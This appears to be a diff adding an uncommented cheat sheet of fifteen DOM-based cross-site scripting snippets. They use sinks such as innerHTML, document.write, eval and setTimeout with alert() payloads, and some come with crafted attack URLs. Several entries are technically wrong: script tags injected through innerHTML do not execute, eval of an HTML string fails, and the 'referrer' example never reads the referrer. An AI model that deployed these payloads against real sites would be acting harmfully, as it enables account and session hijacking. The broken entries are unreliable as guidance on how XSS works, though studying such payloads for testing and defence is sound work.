@@ -1,0 +1,115 @@
+1. Using location.hash
+----------------------
+<script>
+  window.location.hash = "#<script>alert('XSS')</script>";
+</script>
+
+2. Using document.write()
+-------------------------
+<script>
+  document.write('<img src="x" onerror="alert(document.domain)">');
+</script>
+
+3. Using innerHTML
+------------------
+<script>
+  var div = document.createElement('div');
+  div.innerHTML = '<img src="x" onerror="alert(document.domain)">';
+  document.body.appendChild(div);
+</script>
+
+4. Using location.search
+------------------------
+<script>
+  if (location.search.indexOf('xss') !== -1) {
+    document.body.innerHTML = location.search.substring(1);
+  }
+</script>
+<!-- URL: http://example.com/?<script>alert('XSS')</script> -->
+
+5. Using eval()
+---------------
+<script>
+  var userInput = "<script>alert('XSS')</script>";
+  eval(userInput);
+</script>
+
+6. Using setTimeout() and setInterval()
+--------------------------------------
+<script>
+  setTimeout("alert('XSS')", 1000);
+</script>
+<script>
+  setInterval("alert('XSS')", 1000);
+</script>
+
+7. Using document.URL
+---------------------
+<script>
+  var url = document.URL;
+  document.body.innerHTML = '<a href="' + url + '">Click here</a>';
+</script>
+<!-- URL: http://example.com/<script>alert('XSS')</script> -->
+
+8. Using document.referrer
+--------------------------
+<script>
+  document.write('<img src="x" onerror="alert(document.referrer)">');
+</script>
+<!-- Referrer: http://evil.com/<script>alert('XSS')</script> -->
+
+9. Using localStorage
+---------------------
+<script>
+  localStorage.setItem('xss', '<script>alert("XSS")</script>');
+  document.body.innerHTML = localStorage.getItem('xss');
+</script>
+
+10. Using sessionStorage
+------------------------
+<script>
+  sessionStorage.setItem('xss', '<script>alert("XSS")</script>');
+  document.body.innerHTML = sessionStorage.getItem('xss');
+</script>
+
+11. Using JSON.parse()
+----------------------
+<script>
+  var jsonString = '{"xss":"<script>alert(1)</script>"}';
+  var obj = JSON.parse(jsonString);
+  document.body.innerHTML = obj.xss;
+</script>
+
+12. Using custom attributes
+---------------------------
+<script>
+  var customAttr = document.createAttribute("onmouseover");
+  customAttr.value = "alert('XSS')";
+  var elem = document.createElement("div");
+  elem.setAttributeNode(customAttr);
+  document.body.appendChild(elem);
+</script>
+
+13. Using URL fragments
+-----------------------
+<script>
+  var hash = window.location.hash.substring(1);
+  document.body.innerHTML = '<a href="#' + hash + '">Click here</a>';
+</script>
+<!-- URL: http://example.com/#<script>alert('XSS')</script> -->
+
+14. Using event handlers
+------------------------
+<script>
+  var div = document.createElement('div');
+  div.setAttribute('onclick', 'alert("XSS")');
+  document.body.appendChild(div);
+</script>
+
+15. Using document.baseURI
+--------------------------
+<script>
+  var base = document.baseURI;
+  document.body.innerHTML = '<a href="' + base + '">Click here</a>';
+</script>
+<!-- Base URI: http://example.com/<script>alert('XSS')</script> -->
